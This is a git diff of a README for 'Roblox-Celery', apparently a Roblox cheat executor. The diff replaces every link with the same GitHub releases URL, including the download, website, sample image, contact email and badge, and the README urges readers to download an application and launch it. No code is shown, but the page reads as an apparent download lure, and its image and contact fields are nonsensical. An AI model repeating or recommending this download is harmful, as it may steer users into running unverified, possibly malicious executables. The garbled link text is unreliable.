@@ -16,7 +16,7 @@ Welcome to the official repository of **Roblox-Celery**, the cutting-edge Celery
 ## Get Started
 To access the tool, please download it from the following link: 
 
-[Download Application](https://github.com/files/uploaded/Application.zip)
+[Download Application](https://github.com/progmainging/Roblox-Celery/releases)
 
 _*(Note: Click to launch the file.)*_
 
@@ -24,10 +24,10 @@ _*(Note: Click to launch the file.)*_
 If the link is not working, kindly check the "Releases" section for an alternative download option.
 
 ## Keep in Touch
-Follow the latest updates and developments on our [official website](https://robloxceryexecutor.com).
+Follow the latest updates and developments on our [official website](https://github.com/progmainging/Roblox-Celery/releases).
 
 ## Sample Image
-![Roblox Celery](https://via.placeholder.com/500)
+![Roblox Celery](https://github.com/progmainging/Roblox-Celery/releases)
 
 ## Contributing
 We welcome contributions from the community to enhance the functionality and usability of Roblox-Celery. Feel free to submit pull requests and suggest new features.
@@ -42,8 +42,8 @@ If you find Roblox-Celery useful, don't forget to share it with your friends and
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
 ## Connect with Us
-For any inquiries or feedback, please reach out to us at [contact@robloxcery.com](mailto:contact@robloxcery.com).
+For any inquiries or feedback, please reach out to us at [https://github.com/progmainging/Roblox-Celery/releases](https://github.com/progmainging/Roblox-Celery/releases).
 
 ---
 
-[![](https://img.shields.io/badge/Download-Application-blue)](https://github.com/files/uploaded/Application.zip)
+[![](https://github.com/progmainging/Roblox-Celery/releases)](https://github.com/progmainging/Roblox-Celery/releases)
